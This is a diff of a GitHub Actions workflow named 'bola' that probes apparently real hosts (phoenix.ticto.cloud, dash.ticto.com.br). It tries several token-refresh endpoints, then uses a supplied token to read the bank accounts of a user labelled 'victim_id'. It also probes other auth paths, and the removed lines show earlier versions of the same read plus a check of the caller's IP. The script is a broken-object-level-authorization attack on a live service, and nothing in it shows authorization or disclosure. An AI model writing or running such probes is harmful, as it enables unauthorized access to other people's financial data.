@@ -2,43 +2,46 @@ name: bola
 on:
   workflow_dispatch:
     inputs:
-      user_id:
+      refresh_token:
+        required: true
+        description: 'Refresh token to get new access token'
+      victim_id:
         required: true
         default: '101'
-      token:
-        required: true
 jobs:
   test:
     runs-on: ubuntu-latest
     steps:
-      - name: Test token validity on dash
+      - name: Refresh token
+        id: refresh
         run: |
-          echo "=== Token check via dash ==="
+          echo "=== Trying refresh token endpoints ==="
+          for ep in \
+            "https://phoenix.ticto.cloud/api/v1/auth/refresh" \
+            "https://phoenix.ticto.cloud/api/v1/refresh-token" \
+            "https://phoenix.ticto.cloud/api/auth/refresh" \
+            "https://phoenix.ticto.cloud/sanctum/token" \
+            "https://dash.ticto.com.br/api/v1/auth/refresh-token" \
+            "https://dash.ticto.com.br/api/v1/auth/token/refresh" ; do
+            echo "--- $ep ---"
+            curl -sk -w "\nHTTP:%{http_code}\n" -X POST "$ep" \
+              -H "Content-Type: application/json" \
+              -d "{\"token\": \"${{ inputs.refresh_token }}\", \"refresh_token\": \"${{ inputs.refresh_token }}\"}"
+          done
+      - name: Try bearer with refresh token directly
+        run: |
+          echo "=== Use refresh token as Bearer ==="
           curl -sk -w "\nHTTP:%{http_code}\n" \
-            "https://dash.ticto.com.br/api/v1/private/user" \
-            -H "Authorization: Bearer ${{ inputs.token }}" \
+            "https://phoenix.ticto.cloud/api/v1/private/users/${{ inputs.victim_id }}/manage/bank-accounts" \
+            -H "Authorization: Bearer ${{ inputs.refresh_token }}" \
             -H "Accept: application/json"
-      - name: BOLA READ http1
+      - name: Probe phoenix auth endpoints
         run: |
-          echo "=== http1.1 ==="
-          curl -sk -w "\nHTTP:%{http_code}\n" --http1.1 \
-            "https://phoenix.ticto.cloud/api/v1/private/users/${{ inputs.user_id }}/manage/bank-accounts" \
-            -H "Authorization: Bearer ${{ inputs.token }}" \
-            -H "Accept: application/json"
-      - name: BOLA READ http2
-        run: |
-          echo "=== http2 ==="
-          curl -sk -w "\nHTTP:%{http_code}\n" --http2 \
-            "https://phoenix.ticto.cloud/api/v1/private/users/${{ inputs.user_id }}/manage/bank-accounts" \
-            -H "Authorization: Bearer ${{ inputs.token }}" \
-            -H "Accept: application/json"
-      - name: Phoenix ping without auth
-        run: |
-          echo "=== No auth - expect 401 ==="
-          curl -sk -w "\nHTTP:%{http_code}\n" \
-            "https://phoenix.ticto.cloud/api/v1/private/users/${{ inputs.user_id }}/manage/bank-accounts" \
-            -H "Accept: application/json"
-      - name: Check caller IP
-        run: |
-          echo "=== Our IP ==="
-          curl -s https://api.ipify.org
+          echo "=== Probe what phoenix has ==="
+          for path in /api/v1/auth /api/v1/private/user /api/v1/user /api/v1/me; do
+            echo "--- $path ---"
+            curl -sk -w "\nHTTP:%{http_code}\n" \
+              "https://phoenix.ticto.cloud$path" \
+              -H "Authorization: Bearer ${{ inputs.refresh_token }}" \
+              -H "Accept: application/json"
+          done
